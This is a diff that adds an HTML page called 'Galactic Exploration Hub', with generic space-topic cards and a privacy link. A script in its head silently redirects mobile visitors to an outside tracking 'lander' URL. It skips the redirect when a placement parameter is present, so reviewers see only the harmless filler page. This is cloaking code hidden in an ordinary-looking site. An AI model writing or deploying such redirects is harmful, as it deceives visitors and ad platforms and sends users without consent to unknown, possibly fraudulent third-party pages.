@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/dade2563-43ce-4351-9ba3-22961c539221?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Galactic Exploration Hub</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background-color: #0a0a2a;
+            color: #e6e6fa;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            padding: 20px;
+        }
+        header {
+            background-color: #1a1a4a;
+            padding: 20px;
+            text-align: center;
+        }
+        h1 {
+            font-size: 2.5em;
+            color: #ffd700;
+        }
+        .card {
+            background-color: #2a2a6a;
+            border-radius: 15px;
+            padding: 20px;
+            text-align: center;
+        }
+        footer {
+            background-color: #1a1a4a;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+        a {
+            color: #ffd700;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Galactic Exploration Hub</h1>
+    </header>
+    <div class="container">
+        <div class="card">
+            <h2>Planetary Discoveries</h2>
+            <p>Explore newly discovered exoplanets and their unique characteristics.</p>
+        </div>
+        <div class="card">
+            <h2>Spacecraft Technology</h2>
+            <p>Learn about the latest advancements in interstellar travel technology.</p>
+        </div>
+        <div class="card">
+            <h2>Alien Life Forms</h2>
+            <p>Discover potential extraterrestrial life and their habitats.</p>
+        </div>
+        <div class="card">
+            <h2>Space Colonies</h2>
+            <p>Find out about ongoing projects to establish human colonies in space.</p>
+        </div>
+        <div class="card">
+            <h2>Cosmic Phenomena</h2>
+            <p>Unravel the mysteries of black holes, supernovas, and other cosmic events.</p>
+        </div>
+        <div class="card">
+            <h2>Intergalactic Communication</h2>
+            <p>Explore methods of communicating across vast cosmic distances.</p>
+        </div>
+    </div>
+    <footer>
+        <a href="https://tokreward.com/privacy.html">Privacy Policy</a>
+    </footer>
+</body>
+</html>
